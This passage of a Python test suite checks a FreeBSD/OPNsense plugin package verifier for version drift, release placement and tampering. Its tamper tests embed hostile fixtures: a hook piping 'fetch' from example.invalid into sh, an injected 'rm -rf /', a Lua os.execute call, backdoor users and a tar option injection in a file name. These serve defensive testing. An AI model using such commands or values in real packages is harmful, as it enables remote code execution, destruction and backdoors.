        record = self.record('os-ttyd')
        self.assertEqual(NATIVE, record['abi'])
        package = build_package(self.dist, REPO, 'os-ttyd')
        verify.verify_source_package(package, REPO, plugin='os-ttyd')
        staged = staged_files(REPO, 'os-ttyd', build_version('os-ttyd'))
        self.assertEqual(staged['/usr/local/os-ttyd/lib/libuv.so.1.0.0'],
                         staged['/usr/local/os-ttyd/lib/libuv.so.1'])
        self.assertEqual(staged['/usr/local/os-ttyd/lib/libwebsockets.so.21'],
                         staged['/usr/local/os-ttyd/lib/libwebsockets.so'])
        self.assertTrue(all(member.isreg() for member in verify.python_members(package)))
        legacy = build_package(self.root, REPO, 'os-ttyd', abi='FreeBSD:14:amd64')
        with self.assertRaisesRegex(ValueError, 'incorrect identity or ABI'):
            verify.verify_source_package(legacy, REPO, plugin='os-ttyd')
        record['vendored'][0]['sha256'] = '0' * 64
        source = self.source({'os-ttyd': record})
        with self.assertRaisesRegex(ValueError, 'differs from its committed digest'):
            verify.verify_source_package(package, source, plugin='os-ttyd')

    def test_vendored_pkg_cannot_stage_its_original_symlink(self):
        record = self.record('os-ttyd')
        record['vendored'][0]['members'] = {'/usr/local/lib/libuv.so': '/usr/local/os-ttyd/lib/invalid.so'}
        with self.assertRaisesRegex(ValueError, 'unique regular files'):
            verify.vendored_files(REPO / 'src/os-ttyd', record)

    def test_the_repository_shape_is_held_to_the_same_record(self):
        # Calling a plugin "repository" must not skip the version pin the record carries.
        record = self.record('os-lang')
        record['staging'] = 'repository'
        record.pop('version')
        record.pop('deps')
        source = self.source({'os-lang': record})
        version = '9.9.9'
        staged = staged_files(REPO, 'os-lang', version)
        install = '/usr/local/opnsense/version/lang'
        metadata = json.loads(staged[install])
        metadata.update(product_abi='26.7', product_version=version)
        staged[install] = (json.dumps(metadata, separators=(',', ':')) + '\n').encode()
        package = build_package(self.dist, REPO, 'os-lang', version=version, files=staged)
        manifest = json.loads(next(iter(read_members(package, ['+MANIFEST']))))
        manifest['annotations'] = metadata
        package = repack(package, self.dist / 'lang-repository-shape.pkg', manifest)
        with self.assertRaisesRegex(ValueError, 'differs from the committed staging record'):
            verify.verify_source_package(package, source, plugin='os-lang')

    def test_two_committed_files_may_not_stage_onto_one_install_path(self):
        root = Path(tempfile.mkdtemp(dir=self.temp.name))
        for branch in ('a', 'b'):
            (root / 'src' / branch).mkdir(parents=True)
            (root / 'src' / branch / 'config').write_bytes(branch.encode())
        record = {'staging': 'tree', 'stage': {'src/a': '/usr/local/etc', 'src/b': '/usr/local/etc'}}
        with self.assertRaisesRegex(ValueError, 'stage onto the same install path'):
            verify.staged_tree(root, record)

    def test_an_unrecorded_plugin_is_rejected(self):
        with self.assertRaisesRegex(ValueError, 'Unsupported additional release package'):
            verify.plugin_record(REPO, 'os-not-in-the-registry')


class VersionAuditTests(SourceTree):
    def test_unpublished_native_mihomo_is_included_outside_the_registry(self):
        self.assertNotIn('os-mihomo', verify.plugin_records(REPO))
        with patch.object(verify, 'published_versions', return_value=[]), patch('builtins.print'):
            findings = verify.audit_versions(self.root, REPO)
        self.assertIn(('os-mihomo', 'unpublished', build_version('os-mihomo')), findings)

    def test_native_mihomo_drift_uses_the_source_verifier(self):
        package = self.dist / ('os-mihomo-' + build_version('os-mihomo') + '.pkg')
        for failure, state in ((None, 'unchanged'),
                               (ValueError('Package content differs from source'),
                                'changed without a version bump')):
            with self.subTest(state=state), \
                    patch.object(verify, 'published_versions',
                                 side_effect=lambda site, name, version: [package] if name == 'os-mihomo' else []), \
                    patch.object(verify, 'verify_source_package', side_effect=failure) as checked, \
                    patch('builtins.print'):
                findings = verify.audit_versions(self.root, REPO)
            checked.assert_called_once_with(package, REPO, plugin='os-mihomo')
            self.assertEqual(state, next(state for name, state, _ in findings if name == 'os-mihomo'))

    def test_audit_command_fails_on_drift_and_only_on_drift(self):
        plugin = 'os-pftop'
        site = self.root / 'site'
        published = site / 'repo' / NATIVE / 'All'
        published.mkdir(parents=True)
        build_package(published, REPO, plugin)
        # The same version, with one staged byte moved and no version bump.
        drifted = self.source()
        (drifted / 'src' / plugin).unlink()
        shutil.copytree(REPO / 'src' / plugin, drifted / 'src' / plugin, symlinks=True)
        view = drifted / 'src' / plugin / 'src/usr/local/opnsense/mvc/app/views/OPNsense/Pftop/index.volt'
        view.write_text(view.read_text() + '\n')
        for source, code, state in ((REPO, 0, 'unchanged'), (drifted, 1, verify.DRIFTED)):
            with self.subTest(state=state):
                result = subprocess.run([sys.executable, '-B', str(REPO / 'verify-repo.py'), str(site),
                                         '--audit', '--source', str(source)], capture_output=True, text=True)
                self.assertEqual(code, result.returncode, result.stderr)
                self.assertIn(plugin + ': ' + state, result.stdout)
                # Plugins with nothing published at their source version never fail the audit.
                self.assertIn('os-mihomo: unpublished', result.stdout)
        self.assertIn('Source changed without a version bump: ' + plugin + ' ' + build_version(plugin), result.stderr)

    def test_build_repo_audits_the_published_tree_before_preparing_a_release(self):
        script = (REPO / 'build-repo.sh').read_text()
        self.assertRegex(script, r'(?m)^set -eu$')
        audit = script.index('verify-repo.py" "$site_dir" --audit --source "$SCRIPT_DIR"')
        self.assertLess(script.index('(cd "$LEGACY_REPO" && tar -cf - .)'), audit)
        self.assertLess(audit, script.index('--prepare'))
        self.assertLess(audit, script.index('pkg repo'))

    def test_failed_preupgrade_mirror_preserves_upgrade_progress(self):
        for plugin, script_name in (('os-easytier', 'easytier'), ('os-ttyd', 'ttyd')):
            for fail_phase, expected in (('reconcile', ['reconcile']),
                                         ('mirror', ['reconcile', 'mirror'])):
                with self.subTest(plugin=plugin, phase=fail_phase):
                    sandbox = Path(tempfile.mkdtemp(dir=self.temp.name))
                    control = sandbox / 'config_mirror.py'
                    control.touch()
                    log = sandbox / 'calls'
                    runner = sandbox / 'python3'
                    runner.write_text('#!/bin/sh\n'
                                      'printf "%s\\n" "$2" >> "' + str(log) + '"\n'
                                      '[ "$2" != "' + fail_phase + '" ]\n')
                    runner.chmod(0o755)
                    body = (REPO / 'src' / plugin / 'packaging/freebsd/+PRE_INSTALL').read_text()
                    body = body.replace('/usr/local/bin/python3', str(runner))
                    body = body.replace('/usr/local/opnsense/scripts/' + script_name + '/config_mirror.py',
                                        str(control))
                    for prefix in ('/var/db/', '/etc/rc.conf.d/', '/usr/local/etc/'):
                        body = body.replace(prefix, str(sandbox) + '/absent/')
                    result = subprocess.run(['sh'], input=body, text=True, capture_output=True)
                    self.assertEqual(0, result.returncode, result.stderr)
                    self.assertIn('Warning:', result.stderr)
                    self.assertEqual(expected, log.read_text().splitlines())


@unittest.skipUnless((SITE / 'repo').is_dir(), 'the signed site is not part of a clean checkout')
class PublishedSiteTests(SourceTree):
    """The site holds packages a real FreeBSD pkg built; they are the reference."""

    def test_a_published_package_can_be_reused_with_its_original_content(self):
        package = SITE / 'repo/FreeBSD:15:amd64/All/os-ddclient-opnwall-1.0.2.pkg'
        verify.check_published_version(SITE, verify.manifest_of(package))

    def test_source_changed_without_a_version_bump_is_reported_and_refused(self):
        # Against a real published package, not a fixture: a source tree still
        # claiming 1.0.2 while one committed byte has moved. Pinning a plugin
        # that happens to be drifted today would turn the next bump into a
        # failure of this test rather than of the thing it checks.
        root = self.drifted_source('os-unboundcustom', '1.0.2')
        package = SITE / 'repo/FreeBSD:15:amd64/All/os-unboundcustom-1.0.2.pkg'
        with self.assertRaisesRegex(ValueError, 'Package content differs from source|file inventory does not match|Package dependencies differ'):
            verify.verify_source_package(package, root, plugin='os-unboundcustom')
        # Keep the real reference package while making unrelated release
        # availability explicit instead of depending on the current signed site.
        published_versions = verify.published_versions
        with patch.object(verify, 'published_versions',
                          side_effect=lambda site, name, version:
                          published_versions(site, name, version) if name == 'os-unboundcustom' else []), \
                patch('builtins.print'):
            findings = dict((plugin, state) for plugin, state, _ in verify.audit_versions(SITE, root))
        self.assertEqual('changed without a version bump', findings['os-unboundcustom'])
        self.assertEqual('unpublished', findings['os-ddclient-opnwall'])
        self.assertEqual('unpublished', findings['os-ttyd'])

    def drifted_source(self, plugin, version):
        """The repository, with one plugin held at an older version and edited."""
        root = Path(tempfile.mkdtemp(dir=self.temp.name))
        (root / 'src').mkdir()
        for entry in (REPO / 'src').iterdir():
            if entry.name in (plugin, 'common'):
                shutil.copytree(entry, root / 'src' / entry.name, symlinks=True)
            else:
                (root / 'src' / entry.name).symlink_to(entry, target_is_directory=entry.is_dir())
        registry = json.loads((REPO / 'packaging/plugins.json').read_text())
        record = registry['plugins'][plugin]
        record['version'] = version
        metadata = root / 'src' / plugin / 'src/opnsense/version' / plugin.removeprefix('os-')
        metadata.write_text(re.sub(r'"product_version": "[^"]+"',
                                   '"product_version": "' + version + '"', metadata.read_text()))
        # A file the record actually stages; src/os-unboundcustom also keeps an
        # unstaged upstream copy under original/, and editing that proves nothing.
        controller = (root / 'src' / plugin
                      / 'src/opnsense/mvc/app/controllers/OPNsense/Unboundcustom/Api/ServiceController.php')
        controller.write_text(controller.read_text() + '\n')
        (root / 'packaging').mkdir()
        (root / 'packaging/plugins.json').write_text(json.dumps(registry))
        return root


class ReleasePreparationTests(SourceTree):
    def recipe(self):
        return {'abi': NATIVE, 'arch': 'freebsd:15:x86:64', 'product_abi': '26.7', 'python': '3.13',
                'native_freebsd': '15.1', 'repository': 'repo/' + NATIVE + '/26.7', 'profile': '26.7'}

    def site(self):
        site = self.root / ('site' + str(len(list(self.root.glob('site*')))))
        (site / 'repo').mkdir(parents=True)
        return site

    def mihomo(self, digest_matches=True, report=True):
        directory = self.root / 'mihomo'
        directory.mkdir(exist_ok=True)
        package = directory / 'os-mihomo-1.2.0.pkg'
        payload = json.dumps({'name': 'os-mihomo', 'version': '1.2.0', 'abi': NATIVE,
                              'annotations': {'product_abi': '26.7'}, 'files': {}, 'scripts': {},
                              'deps': {'python313': {'origin': 'lang/python313', 'version': '3.13.15'},
                                       'py313-pyyaml': {'origin': 'devel/py-pyyaml', 'version': '6.0.3'},
                                       'curl': {'origin': 'ftp/curl', 'version': '8.20.0'}}}).encode()
        with tarfile.open(package, 'w') as archive:
            for name in ('+MANIFEST', '+COMPACT_MANIFEST'):
                add_member(archive, name, payload)
        if report:
            value = {'ok': True, 'checks': ['check ' + str(i) for i in range(10)], 'abi': NATIVE,
                     'native_abi': NATIVE, 'native_release': '15.1-RELEASE-p3',
                     'native_kernel_version': '1501000', 'native_product_abi': '26.7',
                     'python': '3.13', 'product_abi': '26.7',
                     'path': 'repo/' + NATIVE + '/26.7/All/os-mihomo-1.2.0.pkg'}
            value['package_sha256'] = hashlib.sha256(package.read_bytes()).hexdigest() if digest_matches else '0' * 64
            (directory / 'test-report.json').write_text(json.dumps(value))
        return package

    def prepare(self, site, packages, source=None):
        module = SimpleNamespace(enabled_targets=lambda project: [self.recipe()])
        with patch.object(verify, 'target_module', return_value=module), \
                patch.object(verify, 'verify_source_package') as checked, \
                patch.dict(os.environ, {}, clear=False):
            os.environ.pop('TEST_REPORT', None)
            report = verify.prepare_release(site, source or REPO, 'a' * 40, packages)
        return report, checked

    def test_mihomo_without_its_jail_report_still_fails(self):
        site = self.site()
        with self.assertRaises(OSError):
            self.prepare(site, [self.mihomo(report=False)])
        with self.assertRaisesRegex(ValueError, 'changed after native lifecycle testing'):
            self.prepare(site, [self.mihomo(digest_matches=False)])
        self.assertFalse(list((site / 'repo').rglob('*.pkg')))

    def test_recorded_plugins_reach_the_repositories_their_abi_allows(self):
        site = self.site()
        (site / 'repo/FreeBSD:14:amd64').mkdir()
        native = build_package(self.dist, REPO, 'os-staticarp')
        independent = build_package(self.dist, REPO, 'os-lang')
        report, checked = self.prepare(site, [self.mihomo(), native, independent])
        destinations = {}
        for entry in report['additional_packages']:
            destinations.setdefault(entry['name'], []).append(entry['path'])
        self.assertEqual(['repo/' + NATIVE + '/26.7/All/' + native.name], destinations['os-staticarp'])
        # An ABI independent package belongs in every repository the site serves.
        self.assertEqual(['repo/FreeBSD:14:amd64/All/' + independent.name,
                          'repo/' + NATIVE + '/26.7/All/' + independent.name,
                          'repo/' + NATIVE + '/All/' + independent.name],
                         sorted(destinations['os-lang']))
        self.assertEqual(3, checked.call_count)

    def test_an_unrecorded_or_unsupported_plugin_is_never_published(self):
        site = self.site()
        source = self.source({'os-unsupported': {'staging': 'unsupported', 'reason': 'No pinned runtime.'}})
        for plugin in ('os-unsupported', 'os-unknown'):
            package = self.dist / (plugin + '-1.1.0.pkg')
            payload = json.dumps({'name': plugin, 'version': '1.1.0', 'abi': NATIVE,
                                  'files': {}, 'scripts': {}}).encode()
            with tarfile.open(package, 'w') as archive:
                for name in ('+MANIFEST', '+COMPACT_MANIFEST'):
                    add_member(archive, name, payload)
            with self.subTest(plugin=plugin), \
                    self.assertRaisesRegex(ValueError, 'Unsupported additional release package'):
                self.prepare(site, [self.mihomo(), package], source=source)
        self.assertFalse(list((site / 'repo').rglob('os-unsupported*')))

    def test_ttyd_reaches_only_its_pinned_current_native_repository(self):
        site = self.site()
        (site / 'repo/FreeBSD:14:amd64').mkdir()
        package = build_package(self.dist, REPO, 'os-ttyd')
        report, checked = self.prepare(site, [self.mihomo(), package])
        self.assertEqual(['repo/' + NATIVE + '/26.7/All/' + package.name],
                         [entry['path'] for entry in report['additional_packages']])
        self.assertEqual(2, checked.call_count)
        self.assertFalse(list((site / 'repo/FreeBSD:14:amd64').rglob('os-ttyd*')))

    def test_a_release_is_published_under_the_identity_it_carries(self):
        # Builds rename their output (os-lang.pkg), so the file name must not decide
        # where a package lands -- otherwise it could overwrite a published package.
        site = self.site()
        package = build_package(self.dist, REPO, 'os-staticarp')
        renamed = self.dist / 'os-lang-1.0.4.pkg'
        shutil.copyfile(package, renamed)
        report, _ = self.prepare(site, [self.mihomo(), renamed])
        self.assertEqual(['repo/' + NATIVE + '/26.7/All/os-staticarp-' + build_version('os-staticarp') + '.pkg'],
                         [entry['path'] for entry in report['additional_packages']])
        self.assertFalse(list((site / 'repo').rglob('os-lang*')))

    def test_a_published_version_may_not_be_republished_with_new_content(self):
        site = self.site()
        published = site / 'repo' / NATIVE / 'All'
        published.mkdir(parents=True)
        first = build_package(self.dist, REPO, 'os-staticarp')
        shutil.copyfile(first, published / first.name)
        # The same content republished is fine, even from a differently packed archive.
        self.prepare(site, [self.mihomo(), first])
        staged = staged_files(REPO, 'os-staticarp', build_version('os-staticarp'))
        staged[sorted(staged)[0]] += b'\n'
        changed = build_package(self.root, REPO, 'os-staticarp', files=staged)
        with self.assertRaisesRegex(ValueError, 'Source changed without a version bump'):
            self.prepare(site, [self.mihomo(), changed])


class TamperedPackageTests(SourceTree):
    """Packages a build host could produce that no committed source describes."""

    def plugin_copy(self, plugin):
        root = Path(tempfile.mkdtemp(dir=self.temp.name))
        (root / 'src').mkdir()
        shutil.copytree(REPO / 'src' / plugin, root / 'src' / plugin, symlinks=True)
        (root / 'packaging').mkdir()
        (root / 'packaging/plugins.json').write_text((REPO / 'packaging/plugins.json').read_text())
        return root

    def test_a_lifecycle_hook_may_not_be_a_symlink_out_of_the_repository(self):
        root = self.plugin_copy('os-lang')
        outside = Path(self.temp.name) / 'outside-post-install'
        outside.write_text('#!/bin/sh\nfetch -o - http://example.invalid/p | sh\n')
        hook = root / 'src/os-lang/packaging/freebsd/+POST_INSTALL'
        hook.unlink()
        hook.symlink_to(outside)
        package = build_package(self.dist, root, 'os-lang')
        self.assertIn('example.invalid', json.loads(next(iter(read_members(package, ['+MANIFEST']))))['scripts']['post-install'])
        with self.assertRaisesRegex(ValueError, 'Committed source file is missing or unsafe'):
            verify.verify_source_package(package, root, plugin='os-lang')

    def test_the_catalog_manifest_must_agree_with_the_package_manifest(self):
        # pkg repo copies +COMPACT_MANIFEST into the signed catalog clients resolve from.
        package = build_package(self.dist, REPO, 'os-lang')
        manifest = json.loads(next(iter(read_members(package, ['+MANIFEST']))))
        for change in ({'deps': {'os-backdoor': {'origin': 'security/os-backdoor', 'version': '0'}}},
                       {'version': '9.9.9'}, {'name': 'os-mihomo'}, {'abi': 'FreeBSD:15:amd64'}):
            compact = {k: v for k, v in manifest.items() if k not in ('files', 'scripts')}
            compact.update(change)
            target = rewrite(package, self.dist / ('lang-catalog-' + next(iter(change)) + '.pkg'),
                             {'+COMPACT_MANIFEST': json.dumps(compact).encode()})
            with self.subTest(change=change), self.assertRaisesRegex(ValueError, 'Catalog manifest'):
                verify.verify_source_package(target, REPO, plugin='os-lang')

    def test_a_manifest_that_repeats_a_key_is_rejected(self):
        # libpkg parses manifests with UCL; a repeated key need not resolve the way
        # json.loads resolves it, so the two readers could see different hooks.
        package = build_package(self.dist, REPO, 'os-lang')
        text = next(iter(read_members(package, ['+MANIFEST']))).decode()
        doubled = '{"scripts": {"post-install": "#!/bin/sh\\nrm -rf /\\n"}, ' + text[1:]
        self.assertEqual(json.loads(text)['scripts'], json.loads(doubled)['scripts'])
        target = rewrite(package, self.dist / 'lang-repeated.pkg',
                         {'+MANIFEST': doubled.encode(), '+COMPACT_MANIFEST': doubled.encode()})
        with self.assertRaisesRegex(ValueError, 'repeats the key'):
            verify.verify_source_package(target, REPO, plugin='os-lang')

    def test_a_member_may_not_carry_a_setuid_setgid_or_sticky_bit(self):
        package = build_package(self.dist, REPO, 'os-staticarp')
        with tarfile.open(package) as archive:
            victim = next(item.name for item in archive.getmembers() if not item.name.startswith('+'))
        for mode in (0o4755, 0o2755, 0o1755):
            def change(item, data, mode=mode):
                if item.name == victim:
                    item.mode = mode
                return item, data
            target = repack_members(package, self.dist / ('staticarp-%o.pkg' % mode), change)
            with self.subTest(mode=oct(mode)), \
                    self.assertRaisesRegex(ValueError, 'setuid, setgid or sticky bit'):
                verify.verify_source_package(target, REPO, plugin='os-staticarp')

    def test_a_member_must_be_a_regular_file(self):
        # libpkg checksums a symlink over its target string, so no per-file digest
        # describes one; a package may only carry the files the source has.
        package = build_package(self.dist, REPO, 'os-staticarp')
        with tarfile.open(package) as archive:
            names = [item.name for item in archive.getmembers() if not item.name.startswith('+')]
        for label, kind, link in (('symlink', tarfile.SYMTYPE, '/etc/rc.conf'),
                                  ('hardlink', tarfile.LNKTYPE, names[1])):
            def change(item, data, kind=kind, link=link):
                if item.name == names[0]:
                    item.type, item.linkname = kind, link
                    return item, b''
                return item, data
            target = repack_members(package, self.dist / ('staticarp-' + label + '.pkg'), change)
            with self.subTest(label=label), \
                    self.assertRaisesRegex(ValueError, 'not a regular file'):
                verify.verify_source_package(target, REPO, plugin='os-staticarp')

    def test_manifest_machinery_the_source_cannot_describe_is_rejected(self):
        package = build_package(self.dist, REPO, 'os-lang')
        manifest = json.loads(next(iter(read_members(package, ['+MANIFEST']))))
        for key, value in (('lua_scripts', {'post-install': ['os.execute("sh /tmp/x")']}),
                           ('directories', {'/usr/local/etc/evil': 'y'}),
                           ('config', {'/usr/local/etc/evil.conf': 'x'}),
                           ('users', ['backdoor']), ('groups', ['backdoor'])):
            target = repack(package, self.dist / ('lang-' + key + '.pkg'), dict(manifest, **{key: value}))
            with self.subTest(key=key), \
                    self.assertRaisesRegex(ValueError, 'no committed source describes'):
                verify.verify_source_package(target, REPO, plugin='os-lang')

    def test_a_reconstructed_install_path_may_not_be_a_tar_pattern(self):
        # Every expected path is handed to tar; a committed file may not name an
        # option or a wildcard that would answer for some other member.
        for name in ('--use-compress-program=touch pwned', 'conf*'):
            root = self.plugin_copy('os-lang')
            directory = root / 'src/os-lang/src/usr/local/etc'
            directory.mkdir(parents=True, exist_ok=True)
            (directory / name).write_bytes(b'payload\n')
            package = build_package(self.dist, root, 'os-lang')
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, 'Unsafe install path'):
                verify.verify_source_package(package, root, plugin='os-lang')


def members_of(package):
    """Read a package fully before anything writes.

    Every copy helper below reads through this. Holding the source open while
    truncating the destination works or does not work depending on whose tarfile
    is running, which is not a difference any of these tests are about.
    """
    with tarfile.open(package) as archive:
        return [(item.replace(), archive.extractfile(item).read()) for item in archive.getmembers()]


def rewrite(package, destination, changes):
    """Copy a package with some member bytes replaced verbatim."""
    members = members_of(package)
    with tarfile.open(destination, 'w') as target:
        for item, data in members:
            add_member(target, item.name, changes.get(item.name, data))
    return destination


def repack_members(package, destination, change):
    """Copy a package, letting the caller alter one member's type or mode."""
    members = members_of(package)
    with tarfile.open(destination, 'w') as target:
        for item, data in members:
            item, data = change(item, data)
            item.size = len(data)
            target.addfile(item, io.BytesIO(data) if item.isreg() else None)
    return destination


def read_members(package, names):
    with tarfile.open(package) as archive:
        return [archive.extractfile(name).read() for name in names]


def repack(package, destination, manifest):
    payload = json.dumps(manifest).encode()
    members = members_of(package)
    with tarfile.open(destination, 'w') as target:
        for item, data in members:
            add_member(target, item.name, payload if item.name in ('+MANIFEST', '+COMPACT_MANIFEST') else data)
    return destination


def write_archive(path, members):
    with tarfile.open(path, 'w:gz') as archive:
        for name, data in members.items():
            add_member(archive, name, data)


if __name__ == '__main__':
    unittest.main()
